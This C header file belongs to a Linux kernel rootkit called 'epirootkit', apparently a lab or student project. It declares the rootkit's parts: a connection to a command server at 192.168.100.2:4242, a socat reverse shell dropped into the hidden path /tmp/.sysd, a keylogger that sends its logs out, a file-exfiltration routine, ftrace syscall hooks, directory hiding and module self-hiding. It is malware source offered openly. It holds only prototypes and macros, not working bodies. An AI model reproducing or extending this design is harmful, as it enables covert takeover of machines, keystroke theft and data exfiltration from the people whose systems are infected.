#ifndef EPIROOTKIT_H
#define EPIROOTKIT_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/ftrace.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

// Configuration macros
#define DEBUG 1
#define DBG_MSG(fmt, args...) \
	do { \
		if (DEBUG) { \
			pr_info(fmt, ##args); \
		} \
	} while (0)
#define ERR_MSG(fmt, args...) \
	do { \
		if (DEBUG) { \
			pr_err(fmt, ##args); \
		} \
	} while (0)

#define SERVER_IP "192.168.100.2"
#define SERVER_PORT 4242
#define REVERSE_SHELL_PORT 9001
#define CONNEXION_MESSAGE "epirootkit: connexion established\n"
#define STDOUT_FILE "/tmp/std.out"
#define STDERR_FILE "/tmp/std.err"
#define SOCAT_BINARY_PATH "/tmp/.sysd"

#define SUCCESS 0
#define FAILURE 1
#define MAX_MSG_SEND_OR_RECEIVE_ERROR 10
#define TIMEOUT_BEFORE_RETRY 1000
#define RCV_CMD_BUFFER_SIZE 1024
#define STD_BUFFER_SIZE 2048

// Used by exec_str_as_command 
// to store the return code of the command
struct exec_code_stds {
	int code;
	char *std_out;
	char *std_err;
};

// Used by print_file
// Corresponds to the log level to use for printing
enum text_level {
	INFO,
	WARN,
	ERR,
	CRIT,
};

extern size_t hook_array_size;

// Global control variables
extern struct socket *sock;					// Socket for network communication
extern struct exec_code_stds exec_result;	// Last execution result
extern struct task_struct *network_thread;	// Thread for network communication
extern bool thread_exited;					// Flag to indicate if the thread has exited

// Function prototypes
int init_exec_result(void);									// Initialize exec_result structure
int free_exec_result(void);									// Free exec_result structure
int exec_str_as_command(char *user_cmd);					// Execute a command string in user mode
int send_to_server(char *message, ...);						// Send a message to the server
int send_file_to_server(char *filename);					// Send a file to the server
int network_worker(void *data);								// Kernel thread for network communication
char *read_file(char *filename, int *readed_size);			// Read the content of a file into a dynamically allocated buffer
int print_file(char *content, enum text_level level);		// Print the content of a buffer to the kernel log
int close_socket(void);										// Release the socket
int close_thread(void);										// Close the kernel thread
int epikeylog_init(int keylog_mode);						// Initialize the keylogger
int epikeylog_send_to_server(void);							// Send keylogger content to the server
int epikeylog_exit(void);									// Cleanup function for the keylogger
int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
int launch_reverse_shell(void);								// Launch the reverse shell with socat
int stop_reverse_shell(void);								// Stop the reverse shell
int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server

extern char *ip;
extern int port;
extern char *message;

// Hooks and Ftrace parameters
struct ftrace_hook{
    const char *name;       /* Name of the target symbol */
    void *function;         /* Address of the hook function */
    void *original;         /* Pointer to storage for the original address */
    unsigned long address;  /* Resolved address of the target symbol */
    struct ftrace_ops ops;
};

#define SYSCALL_NAME(name) ("__x64_" name)
#define HOOK(_name, _hook, _orig)                                              \
    {                                                                          \
        .name = SYSCALL_NAME(_name),                                           \
        .function = (_hook),                                                   \
        .original = (_orig),                                                   \
    }

unsigned long (*fh_init_kallsyms_lookup(void))(const char *);
int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

// Array of hooks for syscall table
extern struct ftrace_hook hooks[];

// Hooks
asmlinkage int mkdir_hook(const char __user *pathname, int mode);

// Helper functions for hooks
int add_hidden_dir(const char *dirname);
int remove_hidden_dir(const char *dirname);
int is_hidden(const char *name);

// Module Hider
int hide_module(void);		// Hide the module from the kernel
int unhide_module(void);	// Unhide the module in the kernel

// Directory entry structure as 'returned' (by pointer) by getdents64 syscall
// Used to read a directory content
// If I do not define it here, I have a compilation error... does not seem to be included in linux headers
// (tried dirent.h, with no success)
// (at least not in the ones I have on my system LOL)
struct linux_dirent64 { 
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

#endif // EPIROOTKIT_H
